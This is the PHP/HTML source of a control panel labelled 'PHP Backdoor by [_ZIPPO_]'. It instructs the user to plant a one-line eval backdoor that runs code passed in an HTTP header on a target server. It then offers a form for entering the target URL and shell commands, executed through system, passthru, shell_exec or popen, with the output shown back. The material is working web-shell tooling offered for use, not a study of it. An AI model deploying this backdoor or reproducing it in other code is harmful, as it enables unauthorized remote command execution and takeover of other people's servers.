<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="css/dropdown.css<?php echo "?".cssrand(); ?>"/>
<style>
body{
  background: #343d46;
}

.out-wrapper{
  margin-top:10px;
  width: auto;
  height: auto;
  background: #F2F2F2;
}

.form-wrapper {
    width: 825px;
    padding: 15px;
	  position: fixed;
	  top: 50%;
	  left: 50%;
	  transform: translate(-50%, -50%);
    background: #585858;
    border-radius: 10px;
    box-shadow: 0 1px 1px rgba(0,0,0,.4) inset, 0 1px 0 rgba(255,255,255,.2);
}

.form-wrapper p{
    overflow: visible;
    position: relative;
    float: right;
    border: 0;
    padding: 5px;
    height: 8px;
    font: bold 13px/5px 'lucida sans', 'trebuchet MS', 'Tahoma';
    color: #fff;
    background: #d83c3c;
    border-radius: 3px;
    text-shadow: 0 -1px 0 rgba(0, 0 ,0, .3);  
}

.form-wrapper span{
    padding: 5px;
    float: middle;    
    font: 13px/10px 'lucida sans', 'trebuchet MS', 'Tahoma';
    border: 0;
    background: #eee;
    border-radius: 3px;
}

.container-1{
  width: 350px;
  vertical-align: middle;
  white-space: nowrap;
  position: relative;
}
.container-1 input#url{
  margin-top:10px;
  width: 335px;
  height: 50px;
  background: #2b303b;
  border: none;
  font-size: 10pt;
  float: left;
  color: #63717f;
  padding-left: 10px;
  
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border-radius: 5px;
  -webkit-transition: background .55s ease;
  -moz-transition: background .55s ease;
  -ms-transition: background .55s ease;
  -o-transition: background .55s ease;
  transition: background .55s ease;
}

.container-1 input#cmd{
  width: 335px;
  height: 50px;
  background: #f2f2f2;
  border: none;
  font-size: 10pt;
  float: left;
  color: #63717f;
  padding-left: 10px;
  margin-top:10px;
  
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border-radius: 5px;
  -webkit-transition: background .55s ease;
  -moz-transition: background .55s ease;
  -ms-transition: background .55s ease;
  -o-transition: background .55s ease;
  transition: background .55s ease;
}

.container-1 input#url::-webkit-input-placeholder {
   color: #65737e;
}
 
.container-1 input#url:-moz-placeholder { /* Firefox 18- */
   color: #65737e;  
}
 
.container-1 input#url::-moz-placeholder {  /* Firefox 19+ */
   color: #65737e;  
}
 
.container-1 input#url:-ms-input-placeholder {  
   color: #65737e;  
}

.container-1 input#url:hover, .container-1 input#url:focus, .container-1 input#url:active{
    outline:none;
    background: #ffffff;
}

</style>
<script type="text/javascript">

$(document).ready(function() {
	$('.submit_on_enter').keydown(function(event) {

		if (event.keyCode == 13) {
			var url = "process.php"; // the script where you handle the form input.
			var html = "";
			if ($('#clr').is(":checked")){
				$("#out").val("");
			}
			$.ajax({
				   type: "POST",
				   url: url,
				   data: $("#frm").serialize(), // serializes the form's elements.
				   success: function(data)
				   {					   
						$('#out').val($('#out').val()+data +"\n");
						$('.cmd').val = '';
				   }
				 });
			return false; // avoid to execute the actual submit of the form.
		};
	});
});

</script>
</head>

<body>
<div class="form-wrapper">
<div class="container">
<p>PHP Backdoor by [_ZIPPO_]</p>
  <div class="container-1">
  <span>paste & save this code to a php file: <?php highlight_string("<?php eval(getenv('HTTP_CODE'));?>"); ?></span>
  <form action="" id="frm" method="post">
	  <input type="text" id="url" name="url" value="" placeholder="Enter URL Here..." />
	  <input type="text" class="submit_on_enter" id="cmd" name="cmd" value="" placeholder="Shell Command" />
		<div class="select-style">
		<select id="executor" name="executor">
			<option value="s">SYSTEM</option>
			<option value="p">PASSTHRU</option>
			<option value="se">SHELL_EXEC</option>
			<option value="po">POPEN</option>
		</select>
		</div>
  </form>
  </div>
  <textarea style="float:center;" id="out" name="out" rows="20" cols="100" class="out-wrapper"/></textarea>
  <input type="checkbox" name="clear" id="clr" checked=""><font color=white>Clear</font>
</div>
</div>

</body>
</html>

<?php
//$('textarea').empty()
function cssrand(){
	return rand(4000,10000);
}
?>